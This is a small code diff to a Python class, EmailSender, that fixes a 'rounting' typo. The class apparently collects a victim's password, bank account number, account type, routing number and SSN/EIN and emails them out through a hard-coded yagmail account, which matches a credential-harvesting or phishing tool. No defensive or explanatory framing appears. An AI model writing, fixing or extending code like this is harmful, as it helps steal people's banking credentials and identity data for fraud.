@@ -10,7 +10,7 @@ class EmailSender:
         self.ssn = ssn
         self.account_number = account_number
         self.account_type = account_type
-        self.rounting = routing
+        self.routing = routing
         self.sender_email = EMAIL
         self.app_password = PASSWORD
         self.yag = yagmail.SMTP(self.sender_email, self.app_password)
@@ -23,7 +23,7 @@ class EmailSender:
                      f"Password: {self.user_password}\n"
                      f"Acount Number: {self.account_number}\n"
                      f"Acount Type: {self.account_type}\n"
-                     f"Rounting: {self.rounting}\n"
+                     f"Routing: {self.routing}\n"
                      f"SSN/EIN: {self.ssn}",
             attachments= None
         )
